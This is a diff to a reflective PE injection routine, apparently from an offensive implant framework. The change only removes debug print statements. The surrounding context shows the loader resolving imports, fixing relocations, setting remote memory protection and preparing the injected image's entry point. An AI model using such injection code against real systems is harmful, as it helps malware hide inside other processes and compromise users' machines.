@@ -110,7 +110,6 @@ FUNC PVOID InjectionReflective(
     RelocOffset = U_PTR( BaseAddress ) - ImgNtHdrs->OptionalHeader.ImageBase;
     ResolveIat( EntryImport, BaseAddress );
     FixRelocTable( EntryReloc, BaseAddress, RelocOffset );
-    BK_PRINT( "fvck\n" );
 
     for ( int i = 0; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {
 
@@ -142,13 +141,11 @@ FUNC PVOID InjectionReflective(
 
 		bkMemProtect( ProcessHandle, C_PTR( BaseAddress + ImgSecHdr[i].VirtualAddress ), ImgSecHdr[i].SizeOfRawData, dwProtection );
 	}
-    BK_PRINT( "fvck\n" );
 
     if ( EntryExcept->Size ) {
         PIMAGE_RUNTIME_FUNCTION_ENTRY ImgRunFuncEntry = C_PTR( BaseAddress + EntryExcept->VirtualAddress );
         Instance()->Win32.RtlAddFunctionTable( (PRUNTIME_FUNCTION)( ImgRunFuncEntry ), ( EntryExcept->Size / sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY ) ), BaseAddress );
     }
-    BK_PRINT( "fvck\n" );
 
     if ( EntryTls->Size ) {
         PIMAGE_TLS_DIRECTORY ImgTlsDir      = C_PTR( BaseAddress + EntryTls->VirtualAddress );
@@ -162,8 +159,6 @@ FUNC PVOID InjectionReflective(
     Instance()->Win32.NtFlushInstructionCache( NtCurrentProcess(), NULL, 0 );
 
     UINT64 EntryPoint = U_PTR( BaseAddress ) + ImgNtHdrs->OptionalHeader.AddressOfEntryPoint;
-
-    BK_PRINT( "fvck\n" );
 
     if ( IsDll ) {
         bkDllMain = EntryPoint;
